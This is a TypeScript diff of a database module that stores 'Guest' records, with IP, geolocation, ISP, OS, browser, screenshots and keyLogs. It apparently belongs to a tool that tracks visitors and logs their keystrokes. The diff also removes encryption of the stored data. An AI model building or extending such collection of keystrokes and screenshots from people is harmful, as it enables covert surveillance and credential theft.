@@ -1,13 +1,12 @@
 import * as FS from 'fs'
 import * as Path from 'path'
-import { Model, Timestamps, Encryption } from 'nedb-models'
+import { Model, Timestamps } from 'nedb-models'
 
-import { BASE_DIR, PASSWORD } from './constants'
+import { BASE_DIR } from './constants'
 
 
 export const storagePath = Path.join(BASE_DIR, 'collections')
 if (!FS.existsSync(storagePath)) FS.mkdirSync(storagePath, {recursive: true})
-const encryption = () => ({password: PASSWORD, algorithm: 'aes256'})
 
 
 export class Guest extends Model {
@@ -44,8 +43,8 @@ export class Guest extends Model {
     networkSpeed:NetworkSpeedObj
 
     async add(
-        ip:string, country = '', countryCode = '', regionName = '', city = '', zip = '',
-        lat = 0, lon = 0, timezone = '', isp = '', os = '', browser = '', browserEngine = '',
+        ip:string, os = '', browser = '', country = '', countryCode = '', regionName = '', city = '',
+        zip = '', lat = 0, lon = 0, timezone = '', isp = '', browserEngine = '',
         cpuArch = '', posts = [], logs = [], screenshots = [], keyLogs = []
     ):Promise<Guest> {
         this.ip = ip
@@ -70,7 +69,6 @@ export class Guest extends Model {
         return await this.save()
     }
 
-    static encryption = encryption
     static datastore() {
         return {filename: Path.join(storagePath, 'guests.db')}
     }
@@ -92,13 +90,10 @@ export class Setting extends Model {
         return await this.save()
     }
 
-    static encryption = encryption
     static datastore() {
         return {filename: Path.join(storagePath, 'settings.db')}
     }
 }
 
 
-Guest.use(Encryption)
 Guest.use(Timestamps)
-Setting.use(Encryption)
